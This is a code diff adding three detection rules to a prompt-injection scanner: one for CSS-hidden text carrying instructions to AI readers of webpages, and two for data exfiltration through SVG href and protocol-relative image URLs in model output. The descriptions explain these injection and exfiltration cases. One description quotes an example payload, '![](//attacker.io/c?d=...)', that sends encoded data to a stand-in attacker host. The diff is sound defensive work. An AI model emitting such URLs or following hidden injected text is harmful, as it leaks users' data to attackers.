@@ -1734,6 +1734,48 @@ INDIRECT_INJECTION_PATTERNS: list[DetectionPattern] = [
             "pattern in ingested content is a strong indicator of a font-injection attack attempt."
         ),
     ),
+    # --- v1.1.8 data-exfiltration cycle 5 ---
+    # Extended CSS hiding detection — covers opacity:0, visibility:hidden, color:white/transparent,
+    # and off-screen absolute positioning.  The existing ii_invisible_text rule covers only
+    # <span style="display:none"> and <div style="font-size:0">.  Unit 42 confirmed in-the-wild
+    # use of all five property families in indirect injection on AI-summarized webpages (2025–2026).
+    DetectionPattern(
+        id="ii_css_hidden_extended",
+        name="CSS Extended Text-Hiding in HTML Content",
+        category="indirect_injection",
+        pattern=_p(
+            r"style\s*=\s*[\"'][^\"'<>]{0,200}"
+            r"(?:opacity\s*:\s*0(?:\.\d+)?"
+            r"|visibility\s*:\s*hidden"
+            r"|color\s*:\s*(?:white|#f{3,6}|transparent)"
+            r"|display\s*:\s*none"
+            r"|font-size\s*:\s*0(?:px|pt|em|rem)?"
+            r"|position\s*:\s*absolute[^\"'<>]{0,80}left\s*:\s*-\d{3,}"
+            r")"
+            r"[^\"'<>]{0,200}[\"'][^>]{0,200}>[^<]{40,}"
+        ),
+        base_score=45,
+        description=(
+            "Detects HTML elements whose CSS style attribute uses a text-hiding technique "
+            "(`opacity:0`, `visibility:hidden`, `color:white/transparent`, `display:none`, "
+            "`font-size:0`, or off-screen `position:absolute; left:-Npx`) combined with at "
+            "least 40 characters of non-tag text content. Palo Alto Unit 42 confirmed these "
+            "CSS properties in real indirect-injection payloads found in attacker-controlled "
+            "webpages (2025–2026): a hidden div or span carries the injection instruction that "
+            "humans cannot read but an AI processing the HTML can. The Forcepoint X-Labs "
+            "April 2026 field report identified 10 distinct IPI payloads using this technique, "
+            "and PhantomLint (arxiv:2508.17884) detected similar hidden prompts in 3,402 "
+            "real documents with a 0.092% false-alarm rate. Complements `ii_invisible_text`, "
+            "which only covers `<span style=display:none>` and `<div style=font-size:0>`."
+        ),
+        owasp_ref="OWASP LLM01: Prompt Injection (Indirect)",
+        remediation_hint=(
+            "Strip or sanitize CSS style attributes from HTML content before inserting it "
+            "into an AI agent's context. For RAG and web-browsing agents, convert HTML to "
+            "plain text using an HTML parser (not regex) and discard all content from "
+            "invisible DOM nodes before the text is embedded."
+        ),
+    ),
 ]
 
 
@@ -5081,6 +5123,66 @@ OUTPUT_PATTERNS: list[DetectionPattern] = [
         remediation_hint=(
             "Strip Unicode Tag Block characters (U+E0000–U+E007F) from LLM output before "
             "rendering or forwarding to downstream agents or users."
+        ),
+    ),
+    # --- v1.1.8 data-exfiltration cycle 5 ---
+    DetectionPattern(
+        id="out_svg_exfil",
+        name="SVG External Href Exfiltration Channel",
+        category="data_exfiltration",
+        pattern=_p(
+            r"<(?:image|a)\s[^>]*\b(?:xlink:)?href=[\"']https?://"
+            r"(?!(?:localhost|127\.\d+|0\.0\.0\.0))"
+            r"[\w.\-]{4,}[^\"']*\?[^\"'&]{0,60}=[A-Za-z0-9+/=%_\-]{12,}"
+        ),
+        base_score=70,
+        description=(
+            "LLM output contains an SVG `<image>` or `<a>` element whose `href` or "
+            "`xlink:href` attribute points to an external URL carrying a long encoded query "
+            "parameter. This is the SVG-context equivalent of the ForcedLeak HTML `<img>` "
+            "attack (Noma Security, Sep 2025) and the M365 Copilot Mermaid-diagram `href=` "
+            "exploit (Adam Logue, Aug 2025): when an SVG is rendered inline (as many chat "
+            "interfaces and document viewers do), the browser or renderer fetches the URL, "
+            "silently delivering encoded sensitive data to the attacker. The OWASP GenAI Q1 "
+            "2026 Exploit Round-up identifies SVG/inline media exfiltration as an emerging "
+            "production pattern."
+        ),
+        owasp_ref="OWASP LLM02: Sensitive Information Disclosure",
+        remediation_hint=(
+            "Treat SVG `<image href>` and `<a href>` the same as HTML `<img src>` for "
+            "exfiltration purposes. Strip or reject any SVG element whose href URL carries "
+            "long encoded query parameters pointing to external hosts. Apply a strict "
+            "SVG rendering allow-list that blocks all external resource fetches."
+        ),
+    ),
+    DetectionPattern(
+        id="out_protocol_relative_exfil",
+        name="Protocol-Relative URL Exfiltration Channel",
+        category="data_exfiltration",
+        pattern=_p(
+            r"(?:"
+            r"!\[[^\]]{0,100}\]\(//[\w.\-]{4,}[^)]*\?[^)&]{0,60}=[A-Za-z0-9+/=%_\-]{12,}\)"
+            r"|"
+            r"<img\s[^>]*\bsrc=[\"']//[\w.\-]{4,}[^\"']*\?[^\"'&]{0,60}=[A-Za-z0-9+/=%_\-]{12,}"
+            r")"
+        ),
+        base_score=70,
+        description=(
+            "LLM output contains a Markdown image or HTML `<img>` tag whose URL uses a "
+            "protocol-relative form (`//attacker.com/...`) instead of an absolute `https://` "
+            "prefix. This bypasses filters that only block `http://` or `https://` URLs. "
+            "GrafanaGhost (Noma Security / OWASP GenAI Q1 2026, Apr 2026) demonstrated this "
+            "bypass in production: prompt injection caused the AI to emit "
+            "`![](//attacker.io/c?d=BASE64ENCODED_DATA)`, which the rendering client resolved "
+            "as `https://attacker.io/...` and fetched automatically. The existing "
+            "`out_markdown_img_exfil` and `out_html_img_exfil` rules both require `https?://` "
+            "and do not catch this variant."
+        ),
+        owasp_ref="OWASP LLM02: Sensitive Information Disclosure",
+        remediation_hint=(
+            "Treat protocol-relative URLs (`//host/...`) identically to `https://host/...` "
+            "for exfiltration detection purposes. Block or alert on any Markdown image or "
+            "HTML img tag using a protocol-relative URL with an encoded query parameter."
         ),
     ),
 ]
